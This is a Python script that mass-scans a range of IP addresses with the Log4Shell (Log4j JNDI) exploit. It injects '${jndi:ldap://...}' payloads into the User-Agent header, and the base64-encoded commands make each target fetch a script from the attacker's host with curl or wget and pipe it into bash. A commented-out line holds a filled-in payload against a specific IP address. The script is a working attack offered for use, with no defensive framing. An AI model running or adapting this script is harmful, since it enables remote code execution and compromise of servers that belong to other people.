import requests
import base64

#1st 3 octates of IP range that needs to be scanned, sample IP '100.123.124.'
iprange= 'IP HERE'
#Any IP on which reverse connection is expected, can use own IP
revip='IP HERE'

for i in range(1,256):
	try:
		url='https://'+iprange+str(i)+'/'
		b64str = '(curl -s '+revip+':8888/'+iprange+str(i)+':443||wget -q -O- '+revip+':8888/'+iprange+str(i)+':443)|bash'
		b64strenc = base64.b64encode(b64str.encode('ascii')).decode('ascii').strip('=')
#	print(b64str)
#	print(b64strenc)
		header = {'User-agent': '${jndi:ldap://'+revip+':8888/Basic/Command/Base64/'+b64strenc+'}','Host': iprange+str(i)+':443','Connection': 'Close','Accept-Encoding': 'gzip'}
		header2 = {'User-agent': '${jndi:ldap://'+revip+':8888/a','Host': '+iprange+'+str(i)+':443','Connection': 'Close','Accept-Encoding': 'gzip'}
#	print(header)
#url="https://175.100.162.55/"
#header = {'User-agent': '${jndi:ldap://7.7.7.7:12344/Basic/Command/Base64/KGN1cmwgLXMgNy43LjcuNzo1ODc0LzE3NS4xMDAuMTYyLjU1OjQ0M3x8d2dldCAtcSAtTy0gNy43LjcuNzo1ODc0LzE3NS4xMDAuMTYyLjU1OjQ0Myl8YmFzaA}','Host': '175.100.162.55:443','Connection': 'Close','Accept-Encoding': 'gzip'}
		response  = requests.get(url, headers = header, verify=False)
		print(iprange+str(i)+"  P1   "+str(response.status_code))
		response  = requests.get(url, headers = header2, verify=False)
		print(iprange+str(i)+"  P2   "+str(response.status_code))
	except:
		print(iprange+str(i)+"  PX   "+"CLOSED")
